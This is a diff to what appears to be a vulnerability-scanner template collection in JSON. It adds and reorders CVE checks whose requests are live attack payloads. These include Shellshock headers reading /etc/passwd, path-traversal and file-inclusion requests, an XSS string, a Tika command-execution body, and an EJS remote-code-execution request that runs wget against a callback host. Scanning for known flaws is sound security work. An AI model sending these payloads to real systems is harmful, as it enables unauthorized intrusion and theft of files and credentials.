@@ -3391,9 +3391,9 @@
       "requests": [
         {
           "headers": {
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -3829,6 +3829,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/navis-documentcloud/js/window.php?wpbase=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2015-3035",
+      "info": {
+        "name": "Multiple TP-LINK Products Vulnerable - Local File Inclusion",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/login/../../../etc/passwd"
           ]
         }
       ]
@@ -6679,11 +6694,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
             "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript"
+            "X-Tika-OCRTesseractPath": "cscript"
           },
           "method": "PUT",
           "path": [
@@ -20233,6 +20248,22 @@
       ]
     },
     {
+      "id": "CVE-2022-2544",
+      "info": {
+        "name": "Ninja Job Board < 1.3.3 - Resume Disclosure via Directory Listing",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp/wp-content/uploads/wpjobboard/",
+            "{{BaseURL}}/wp-content/uploads/wpjobboard/"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-26134",
       "info": {
         "name": "Confluence - Remote Code Execution",
@@ -20561,6 +20592,20 @@
         {
           "raw": [
             "POST /ubus/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n{\"jsonrpc\":\"2.0\",\"id\":3,\"method\":\"call\",\"params\":[\"4183f72884a98d7952d953dd9439a1d1\",\"file\",\"read\",{\"path\":\"/etc/passwd\"}]}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-29078",
+      "info": {
+        "name": "Ejs - RCE",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /page?id={{randstr}}&settings[view%20options][outputFunctionName]=x;process.mainModule.require(%27child_process%27).execSync(%27wget+http://{{interactsh-url}}%27);s HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -21306,6 +21351,20 @@
       ]
     },
     {
+      "id": "CVE-2022-34121",
+      "info": {
+        "name": "CuppaCMS v1.0 - Local File Inclusion",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /templates/default/html/windows/right.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nurl=../../../../../../../../../../../../etc/passwd\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-34328",
       "info": {
         "name": "PMB 7.3.10 - Cross-Site Scripting",
@@ -21553,6 +21612,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-39960",
+      "info": {
+        "name": "Atlassian Jira addon Netic Group Export < 1.0.3 - Unauthenticated Access",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /plugins/servlet/groupexportforjira/admin/json HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\ngroupexport_searchstring=&groupexport_download=true\n"
           ]
         }
       ]
